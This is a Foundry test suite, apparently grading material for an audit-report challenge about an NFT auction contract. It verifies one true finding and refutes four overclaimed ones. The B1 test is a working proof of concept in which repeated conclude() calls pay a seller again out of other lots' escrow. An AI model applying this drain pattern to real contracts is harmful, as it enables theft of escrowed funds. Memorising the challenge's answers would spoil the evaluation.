// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Proof suite for challenge pair ch-01 (Quoinhall saleroom).
//   test_accurate_*    the accurate draft's claims hold on the unmodified contract
//   test_falseclaim_*  each false claim of the overclaimed draft is false on the unmodified contract
import {Test, console2} from "forge-std/Test.sol";
import {QuoinhallSaleroom} from "../src/QuoinhallSaleroom.sol";

/// Ownership-tracking ERC-721 stand-in (the drafts' own PoCs use a no-op mock).
contract ItemCollection {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public getApproved;

    function mint(address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == address(0), "minted");
        ownerOf[tokenId] = to;
    }

    function approve(address spender, uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "not holder");
        getApproved[tokenId] = spender;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "wrong from");
        require(msg.sender == from || getApproved[tokenId] == msg.sender, "not approved");
        getApproved[tokenId] = address(0);
        ownerOf[tokenId] = to;
    }
}

contract ProofTest is Test {
    event CloseProlonged(uint256 indexed lotId, uint64 newClosesAt, uint8 prolongations);

    QuoinhallSaleroom saleroom;
    ItemCollection items;

    address treasury = makeAddr("treasury");
    address mallory = makeAddr("mallory");
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");
    address carol = makeAddr("carol");
    address seller = makeAddr("seller");
    address honest = makeAddr("honest");
    address attacker1 = makeAddr("attacker1");
    address attacker2 = makeAddr("attacker2");

    function setUp() public {
        saleroom = new QuoinhallSaleroom(treasury, 200); // 2% fee
        items = new ItemCollection();
        vm.deal(attacker1, 100 ether);
        vm.deal(attacker2, 100 ether);
        vm.deal(honest, 100 ether);
        vm.deal(alice, 10 ether);
        vm.deal(carol, 10 ether);
    }

    function _consign(address who, uint256 tokenId, uint256 reserve, uint64 duration) internal returns (uint256 lotId) {
        items.mint(who, tokenId);
        vm.startPrank(who);
        items.approve(address(saleroom), tokenId);
        lotId = saleroom.consign(address(items), tokenId, reserve, duration);
        vm.stopPrank();
    }

    function _offer(address who, uint256 lotId, uint256 amount) internal {
        vm.prank(who);
        saleroom.placeOffer{value: amount}(lotId);
    }

    // ------------------------------------------------------------------ accurate draft

    /// B1: conclude() repeats on a sold lot; every repeat pays the seller again out of other lots' ETH.
    /// Same scenario and numbers as the draft's test_doubleConclude, with an ownership-tracking item
    /// contract and the extra end-state checks.
    function test_accurate_B1_repeatConcludePaysSellerFromOtherLots() public {
        uint256 lot1 = _consign(mallory, 1, 1 ether, 1 days);
        _offer(alice, lot1, 4 ether);
        uint256 lot2 = _consign(bob, 2, 1 ether, 3 days);
        _offer(carol, lot2, 6 ether);
        assertEq(address(saleroom).balance, 10 ether, "pool = both leading offers");

        vm.warp(block.timestamp + 2 days); // lot 1 closed, lot 2 open

        vm.prank(mallory); // any account may call; the seller has the motive
        saleroom.conclude(lot1);
        assertEq(mallory.balance, 3.92 ether, "first payout: 4 ETH less 2%");
        assertEq(address(saleroom).balance, 6.08 ether);
        assertFalse(saleroom.getLot(lot1).concluded, "sold branch leaves concluded == false");

        vm.prank(mallory);
        saleroom.conclude(lot1);
        assertEq(mallory.balance, 7.84 ether, "second payout for the same lot");
        assertEq(address(saleroom).balance, 2.16 ether, "3.92 ETH of lot 2's escrow is gone");
        assertEq(saleroom.accruedFees(), 0.16 ether, "fee booked twice");
        console2.log("mallory received (wei):", mallory.balance);
        console2.log("saleroom balance (wei):", address(saleroom).balance);
        console2.log("lot 2 leading offer still escrowed on paper (wei):", saleroom.getLot(lot2).leadingOffer);

        // the number of repeats is limited only by the pool: a third payout of 3.92 ETH exceeds 2.16 ETH
        vm.prank(mallory);
        vm.expectRevert(QuoinhallSaleroom.PayoutFailed.selector);
        saleroom.conclude(lot1);

        // the item was sold once and the winner still gets it
        vm.prank(alice);
        saleroom.collectItem(lot1);
        assertEq(items.ownerOf(1), alice);

        // lot 2 can no longer be paid out: bob is owed 5.88 ETH, the pool holds 2.16 ETH
        vm.warp(block.timestamp + 2 days);
        vm.expectRevert(QuoinhallSaleroom.PayoutFailed.selector);
        saleroom.conclude(lot2);
    }

    /// B1 control: the unsold branch does set the flag, so only the sold branch repeats.
    function test_accurate_B1_control_unsoldLotCannotRepeat() public {
        uint256 lotId = _consign(bob, 7, 1 ether, 1 days);
        vm.warp(block.timestamp + 1 days);
        saleroom.conclude(lotId);
        assertTrue(saleroom.getLot(lotId).concluded);
        assertEq(items.ownerOf(7), bob);
        vm.expectRevert(QuoinhallSaleroom.LotAlreadyConcluded.selector);
        saleroom.conclude(lotId);
    }

    // ------------------------------------------------------------- overclaimed draft

    /// C1 ("the close can be pushed out without limit"): the tenth late offer no longer moves the close.
    function test_falseclaim_C1_prolongationIsCapped() public {
        uint256 lotId = _consign(seller, 1, 1 ether, 1 hours);
        uint64 scheduled = saleroom.getLot(lotId).closesAt;

        vm.warp(scheduled - 10 minutes);
        // the draft's own loop, run 12 times instead of 5
        for (uint256 i = 0; i < 12; i++) {
            address who = i % 2 == 0 ? attacker1 : attacker2;
            uint256 amount = saleroom.minimumOffer(lotId);
            uint64 before = saleroom.getLot(lotId).closesAt;
            _offer(who, lotId, amount);
            uint64 afterOffer = saleroom.getLot(lotId).closesAt;
            if (i < 9) assertEq(afterOffer, scheduled + uint64((i + 1) * 20 minutes), "prolonged");
            else assertEq(afterOffer, before, "offers 10, 11 and 12 do not move the close");
            assertLe(afterOffer, scheduled + 180 minutes, "never past the bound");
            // stay inside the soft-close window without passing the close
            if (afterOffer - block.timestamp > 10 minutes) vm.warp(afterOffer - 10 minutes);
            else vm.warp(block.timestamp + 1 minutes);
        }
        QuoinhallSaleroom.Lot memory lot = saleroom.getLot(lotId);
        assertEq(lot.prolongations, 9);
        assertEq(lot.closesAt, scheduled + 180 minutes);
        console2.log("scheduled close:", scheduled);
        console2.log("close after 12 late offers:", lot.closesAt);
        console2.log("minutes past schedule:", (lot.closesAt - scheduled) / 60);

        // at the bound the lot closes: offers are refused and the seller is paid
        vm.warp(scheduled + 180 minutes);
        uint256 next = saleroom.minimumOffer(lotId);
        vm.prank(attacker1);
        vm.expectRevert(QuoinhallSaleroom.AuctionClosed.selector);
        saleroom.placeOffer{value: next}(lotId);
        saleroom.conclude(lotId);
        assertEq(seller.balance, lot.leadingOffer - (lot.leadingOffer * 200) / 10_000);
    }

    /// C2 ("an offer only needs to exceed the leading offer by 1 wei ... nearly free").
    function test_falseclaim_C2_dustRaiseReverts() public {
        uint256 lotId = _consign(seller, 1, 10 ether, 1 hours);
        uint64 scheduled = saleroom.getLot(lotId).closesAt;
        _offer(honest, lotId, 10 ether);

        vm.warp(scheduled - 10 minutes);
        vm.prank(attacker1);
        vm.expectRevert(QuoinhallSaleroom.RaiseTooSmall.selector);
        saleroom.placeOffer{value: 10 ether + 1}(lotId);
        vm.prank(attacker1);
        vm.expectRevert(QuoinhallSaleroom.RaiseTooSmall.selector);
        saleroom.placeOffer{value: 10.25 ether - 1}(lotId);
        assertEq(saleroom.minimumOffer(lotId), 10.25 ether, "2.5% over the leading offer");

        // use every prolongation with two alternating addresses, always at the minimum
        for (uint256 i = 0; i < 9; i++) {
            address who = i % 2 == 0 ? attacker1 : attacker2;
            _offer(who, lotId, saleroom.minimumOffer(lotId));
            vm.warp(saleroom.getLot(lotId).closesAt - 10 minutes);
        }
        QuoinhallSaleroom.Lot memory lot = saleroom.getLot(lotId);
        assertEq(lot.closesAt, scheduled + 180 minutes);
        assertEq(lot.leader, attacker1);
        assertGt(lot.leadingOffer, 12.48 ether, "nine 2.5% raises on 10 ETH");

        vm.warp(lot.closesAt);
        saleroom.conclude(lotId);
        vm.prank(attacker1);
        saleroom.withdrawRefund();
        vm.prank(attacker2);
        saleroom.withdrawRefund();
        vm.prank(honest);
        saleroom.withdrawRefund();

        // outbid offers come back, the standing one does not: the pair bought the item above the honest price
        uint256 spent = (100 ether - attacker1.balance) + (100 ether - attacker2.balance);
        assertEq(spent, lot.leadingOffer, "the last offer is paid to the seller");
        assertEq(honest.balance, 100 ether, "the outbid honest bidder is whole");
        assertEq(seller.balance, lot.leadingOffer - (lot.leadingOffer * 200) / 10_000);
        assertGt(seller.balance, 10 ether - 0.2 ether, "seller receives more than the honest offer would have paid");
        console2.log("cost to the two addresses (wei):", spent);
        console2.log("seller received (wei):", seller.balance);
        console2.log("delay bought (minutes):", (lot.closesAt - scheduled) / 60);
    }

    /// C3 ("unintended, not documented"): the behaviour is exactly what the KV-09 comment, the
    /// changelog line and the programme page state. This is the regression the changelog names.
    function test_falseclaim_C3_lateOfferPushesClose_asDocumented() public {
        uint256 lotId = _consign(seller, 1, 1 ether, 1 days);
        uint64 scheduled = saleroom.getLot(lotId).closesAt;

        // outside the final 20 minutes: no change
        vm.warp(scheduled - 20 minutes - 1);
        _offer(honest, lotId, 1 ether);
        assertEq(saleroom.getLot(lotId).closesAt, scheduled);
        assertEq(saleroom.getLot(lotId).prolongations, 0);

        // inside the final 20 minutes: +20 minutes, counter 1, event
        vm.warp(scheduled - 20 minutes);
        vm.expectEmit(true, false, false, true, address(saleroom));
        emit CloseProlonged(lotId, scheduled + 20 minutes, 1);
        _offer(attacker1, lotId, 1.025 ether);
        assertEq(saleroom.getLot(lotId).closesAt, scheduled + 20 minutes);

        // the documented constants
        assertEq(saleroom.SOFT_CLOSE_WINDOW(), 20 minutes);
        assertEq(saleroom.SOFT_CLOSE_STEP(), 20 minutes);
        assertEq(saleroom.MAX_PROLONGATIONS(), 9);
        assertEq(uint256(saleroom.MAX_PROLONGATIONS()) * saleroom.SOFT_CLOSE_STEP(), 180 minutes);
    }

    /// C4 ("frozen for more than 7 days"): the worst case is 180 minutes, below the 24-hour Medium floor too.
    function test_falseclaim_C4_worstCaseDelayIs180Minutes() public {
        uint256 lotId = _consign(seller, 1, 1 ether, 14 days);
        uint64 scheduled = saleroom.getLot(lotId).closesAt;
        _offer(honest, lotId, 1 ether);

        vm.warp(scheduled - 1);
        for (uint256 i = 0; i < 9; i++) {
            _offer(i % 2 == 0 ? attacker1 : attacker2, lotId, saleroom.minimumOffer(lotId));
            vm.warp(saleroom.getLot(lotId).closesAt - 1);
        }
        // one more, one second before the final close: accepted as an offer, no further delay
        _offer(attacker2, lotId, saleroom.minimumOffer(lotId));
        uint64 finalClose = saleroom.getLot(lotId).closesAt;
        uint256 delay = finalClose - scheduled;
        assertEq(delay, 180 minutes);
        assertLt(delay, 24 hours);
        assertLt(delay, 7 days);

        vm.warp(finalClose);
        saleroom.conclude(lotId);
        assertGt(seller.balance, 0, "seller paid 180 minutes after the scheduled close");
        vm.prank(attacker2);
        saleroom.collectItem(lotId);
        assertEq(items.ownerOf(1), attacker2, "item released at the same moment");
        console2.log("worst-case delay (seconds):", delay);
    }
}
